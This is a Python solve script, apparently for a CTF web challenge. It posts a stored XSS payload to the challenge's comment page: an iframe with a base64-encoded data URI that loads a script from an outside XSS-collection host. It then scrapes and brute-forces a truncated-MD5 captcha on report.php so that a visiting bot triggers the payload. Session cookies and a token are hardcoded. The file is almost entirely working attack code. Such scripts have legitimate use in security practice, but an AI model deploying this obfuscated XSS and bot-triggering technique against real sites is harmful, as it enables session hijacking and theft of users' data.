import hashlib
from multiprocessing.dummy import Pool as ThreadPool
import requests
import re

# MD5截断数值已知 求原始数据
# 例子 substr(md5(captcha), 0, 6)=60b7ef


def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()

#xsspayload = "<iframe/src=\"data:text/html;base64,PHNDUmlQdCBzUkM9aHR0cHM6Ly94c3Mud3RmL09abG8+PC9zQ3JJcFQ+\">"
#xsspayload = "<iframe/src=\"data:text/html;        base64,PGJvZHk+PHNDUmlQdCBzUkM9aHR0cHM6Ly94c3Mud3RmL1M1UHM+PC9zQ3JJcFQ+\">"
xsspayload = "<iframe/src=\"data:text/html;        base64,PGJvZHk+PHNDUmlQdCBzUkM9aHR0cHM6Ly94c3Mud3RmL2t6dXE+PC9zQ3JJcFQ+\">"


#地址 头定义
url="http://ctf1.linkedbyx.com:10291/"
headers={'Cookie':"Hm_lvt_ec6be1ebbc53f7a86875f54c87c47b30=1554600780; Hm_lpvt_ec6be1ebbc53f7a86875f54c87c47b30=1554606059; PHPSESSID=6s0d4maegq0bivi5sq2ui26vj0; token=ISMvKXpXpadDiUoOSoAfww%3D%3D"}

#留言
data = {'comment':xsspayload,'exec':'1'}
r1 = requests.post(url+"main.php",data=data,headers=headers)
print("\n[+]post message done!" + r1.content.decode())


#报告
r = requests.session()
content = r.get(url+"report.php",headers=headers)
print("\n[+]Got content:\n"+content.content.decode()) #report 页面

pie = re.findall("[a-zA-Z0-9]{6}</p>",content.text)
pie = "".join(pie)
keymd5 = pie[0:-4]
print("\n[+]Got keymd5:\n"+keymd5)
#keymd5 = ans   #已知的md5截断值
md5start = 0   # 设置题目已知的截断位置
md5length = 6

def getflag(captcha):
    data = {'code':captcha,'url':'http://ctf1.linkedbyx.com:10291/report.php','exec':'1'}
    flag = r.post(url+"report.php",data=data,headers=headers)
    #print(data)
    #if "" not in str(flag.content):
    print("\n[+]Done!\n"+ str(flag.content.decode()))

def findmd5(sss):    # 输入范围 里面会进行md5测试
    key = sss.split(':')
    start = int(key[0])   # 开始位置
    end = int(key[1])    # 结束位置
    result = 0
    for i in range(start, end):
        #print(md5(i)[md5start:md5length])
        if md5(i)[0:6] == keymd5:            # 拿到加密字符串
            result = i
            print("\n[+]Got result:\n"+ str(result))    # 打印
            getflag(str(result))
            break

list=[]  # 参数列表
for i in range(1):   # 多线程的数字列表 开始与结尾
    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))
pool = ThreadPool()    # 多线程任务
pool.map(findmd5, list) # 函数 与参数列表
pool.close()
pool.join()

